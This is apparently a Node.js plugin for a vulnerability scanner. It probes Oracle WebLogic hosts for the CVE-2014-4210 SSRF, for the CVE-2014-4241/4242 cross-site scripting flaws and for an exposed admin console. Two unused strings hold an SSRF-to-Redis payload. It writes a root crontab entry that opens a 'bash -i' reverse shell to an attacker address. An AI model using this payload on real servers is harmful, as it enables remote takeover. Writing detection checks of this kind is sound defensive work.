
module.exports={
	tags:"ssrf,weblogic,uddi,xspa",
	"ID":"030108",
    des:"SSRF开放状态监测,CVE-2014-4210,UDDI Explorer,CVE-2014-4241, CVE-2014-4242)",
    dependencies:"",
    suport:"建议关闭/uddiexplorer/SearchPublicRegistries.jsp",
    urls:[
        "https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf",
		"https://blog.gdssecurity.com/labs/2015/3/30/weblogic-ssrf-and-xss-cve-2014-4241-cve-2014-4210-cve-2014-4.html"],
// check weblogic T3
// sort ip.txt|uniq>ip2.txt;mv ip2.txt ip.txt
	doCheck:function (url,fnCbk)
	{
        var _s = this.self,_t = this, 
            i = url.indexOf('/',10),
            szU = url.substr(0, -1 == i ? url.length: i + 1),
            p1 = "/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://127.0.0.1:4455",
            s = szU + p1;
        var oT = {"tags":_t.tags,"url":url};
        var szXXX = `set 1 "\n\n\n\n* * * * * root bash -i >& /dev/tcp/172.18.0.1/21 0>&1\n\n\n\n"
config set dir /etc/
config set dbfilename crontab
save`;
        var szXPay = p1 +"/test%0D%0A%0D%0Aset 1 \"\n\n\n\n* * * * root bash -i >& /dev/tcp/xx.xx.xx.xx[这里是你自己的公网IP]/8888[这里是你监听的端口] 0>&1\n\n\n\n\" config set dir /etc/config set dbfilename crontab save"
        _s.request({method:"GET","uri":s,headers:{"user-agent": _s.g_szUa}},function(e,r,b)
        {
            _s.error(e);
            var iX = 0;
            _s.log(b);
            var szRst = "weblogic.uddi.client.structures.exception.XML_SoapException"; // Connection refused
            if(e);
            else if(r && 200 == r.statusCode && -1 < (iX = b.indexOf(szRst)))
            {
                oT.vul = true;
                oT.payload = p1;
                oT.result = b.substr(iX,Math.min(100,b.length));
                oT["des"] = "发现高危weblogic SSRF CVE-2014-4210漏洞,可访" + s + "问进行测试";
            }
            fnCbk(oT,_t);
        });

        var p2 = "/uddiexplorer/SetupUDDIExplorer.jsp?privateregistry=<script>alert(2)</script>&setPrivateRegistryInquiry=Set+Search+URL", s2 = szU + p2;
        _s.request({method:"GET","uri":s2,headers:{"user-agent": _s.g_szUa}},function(e,r,b)
        {
            _s.error(e);
            var szRst1 = "";
            
            if(e);
            else if(r && 200 == r.statusCode && -1 < b.indexOf(szRst1 = "<script>alert(2)"))
            {
                oT.vul = true;
                oT.result = szRst1;
                oT.payload = p2;
                oT["des"] = "发现高危weblogic CSS(Cross Site Scripting) CVE-2014-4241漏洞,可访" + s2 + "问进行测试";
            }
            fnCbk(oT,_t);
        });
        var p3 = "/console/consolejndi.portal?_pageLabel=JNDIContextPageGeneral&_nfpb=true&JNDIContextPortlethandle=com.bea.console.handles.JndiContextHandle(\"<script>alert(77)</script>\")",s1 = szU + p3;
        _s.request({method:"GET","uri":s1,headers:{"user-agent": _s.g_szUa}},function(e,r,b)
        {
            _s.error(e);
            // console.log(b);
            var szRst2 = "";
            if(e);
            else if(r && 200 == r.statusCode && -1 < b.indexOf(szRst2 = "<script>alert(77)"))
            {
                oT.vul = true;
                oT.result = szRst2;
                oT.payload = p3;
                oT["des"] = "发现高危weblogic CSS(Cross Site Scripting) CVE-2014-4242漏洞,可访" + s1 + "问进行测试";
            }
            fnCbk(oT,_t);
        });

        var p7 = "/console/login/LoginForm.jsp",
            s9 = szU + p7;
        _s.request({method:"GET","uri":s9,headers:{"user-agent": _s.g_szUa}},function(e,r,b)
        {
            _s.error(e);
            // console.log(b);
            var szRst4 = "";
            if(e);
            else if(r && 200 == r.statusCode && -1 < b.indexOf(szRst4 = "WebLogic Server"))
            {
                oT.vul = true;
                oT.result = szRst4;
                oT.payload = p3;
                oT["des"] = "发现管理控制台" + s9 + "问进行测试";
            }
            fnCbk(oT,_t);
        });
        
        
	}
};